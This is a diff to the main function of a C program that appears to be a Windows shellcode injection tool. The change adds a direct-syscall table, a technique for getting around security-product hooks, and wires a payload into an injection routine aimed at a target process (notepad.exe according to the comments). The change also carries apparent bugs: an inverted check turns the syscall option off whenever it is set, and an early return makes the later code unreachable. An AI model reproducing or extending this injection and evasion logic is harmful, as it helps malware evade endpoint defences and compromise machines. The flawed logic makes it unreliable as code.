@@ -50,35 +50,36 @@ int main(int argc, char *argv[]) {
         return 0;
     }
 
-    // Init handle variables.
+    // Init handle variables & NtTable.
     HMODULE hNTDLLMoudle = NULL;
     HMODULE hKernel32Module = NULL;
+    NtTable pNtTable;
+    ZeroMemory(&pNtTable, sizeof(pNtTable));
     
     // Parse the arguments
     config config;
     ZeroMemory(&config, sizeof(config));
     parseArguments(argc, argv, &config);
 
-    // Print the configuration. For debugging purposes.
-    printConfig(&config);
-
     // If null, set to default.
-    if (!config.directSyscallSwitch) {
+    if (config.directSyscallSwitch != 0) {
         config.directSyscallSwitch = Off;
-    }
+    } 
+
+    // For debugging purposes.
+    //printConfig(&config);
+
 
     switch (config.directSyscallSwitch) {
         case(On):
             // Init the NtTable
-            NtTable pNtTable;
-            ZeroMemory(&pNtTable, sizeof(pNtTable));
-
-            if (!initiateDirectSyscallTable(pNtTable)) {
+            if (!initiateDirectSyscallTable(&pNtTable)) {
                 handleError(ERROR_INVALID_SYSCALL, "Failed to initiate direct syscall table");
                 return 1;
             }
             break;
     }
+
 
     hNTDLLMoudle = GetModuleHandleW(L"ntdll.dll");
     if (!hNTDLLMoudle) {
@@ -94,6 +95,12 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
+
+    configMap* payload = getPayload(config.payload);
+    runShellcodeInjection(TARGET_PROCESS, (PBYTE)payload->payload, payload->payloadSize, config.directSyscallSwitch, &pNtTable);
+
+
+    return 0;
     // Until further notice, the target process will be notepad.exe
     // Also, this option way sucks and will be changed.
     // Not every injection method will need a payload (some use DLLs), 
@@ -110,7 +117,7 @@ int main(int argc, char *argv[]) {
             goto Cleanup;
             return 1;
         }
-        if (!runShellcodeInjection(TARGET_PROCESS, (PBYTE)payload->payload, payload->payloadSize)) {
+        if (!runShellcodeInjection(TARGET_PROCESS, (PBYTE)payload->payload, payload->payloadSize, config.directSyscallSwitch, &pNtTable)) {
             handleError(ERROR_INVALID_INJECTION, "Failed to run shellcode injection");
             goto Cleanup;
             return 1;
